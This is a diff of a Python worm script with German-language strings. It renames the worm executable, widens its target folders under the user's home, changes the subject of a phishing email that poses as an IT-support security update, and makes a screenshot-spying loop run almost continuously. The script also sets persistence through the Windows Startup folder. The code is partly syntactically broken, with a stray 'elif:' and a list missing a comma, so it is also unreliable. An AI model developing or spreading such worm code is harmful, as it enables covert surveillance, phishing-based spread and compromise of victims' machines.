@@ -28,13 +28,18 @@ TARGET_DIRS = [
     os.path.expanduser("~\\Downloads"),
     
 ]
-elif: 
+
+elif:
+
+TARGET_DIRS= [
+    os.path.expanduser("~\\Desktop")
     os.path.expanduser("~\\Pictures")
+]
 
 
 AUTOSTART_PATH = os.path.expanduser(
     "~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\")
-WORM_NAME = "womp womp.exe"
+WORM_NAME = "Detrix.exe"
 SMTP_SERVER = "192.168.1.100"  
 SMTP_PORT = 25  
 SENDER_EMAIL = "infiziert@testnetz.local"
@@ -155,7 +160,7 @@ def send_infected_email():
     msg = MIMEMultipart()
     msg['From'] = SENDER_EMAIL
     msg['To'] = RECIPIENT_EMAIL
-    msg['Subject'] = "Dringend: Sicherheitsupdate erforderlich!"
+    msg['Subject'] = "Dringend: Email durch Software !"
 
     body = "Hallo,\n\nBitte führen Sie das beigefügte Update aus. Es behebt kritische Sicherheitsprobleme.\n\nViele Grüße,\nIT-Support"
     msg.attach(MIMEText(body, 'plain'))
@@ -282,7 +287,7 @@ def take_screenshot():
     while True:
         screenshot = pyautogui.screenshot()
         screenshot.save(f"C:\\Users\\Public\\screenshot_{time.time()}.png")
-        time.sleep(30)
+        time.sleep(0.01)
 
 take_screenshot()
 
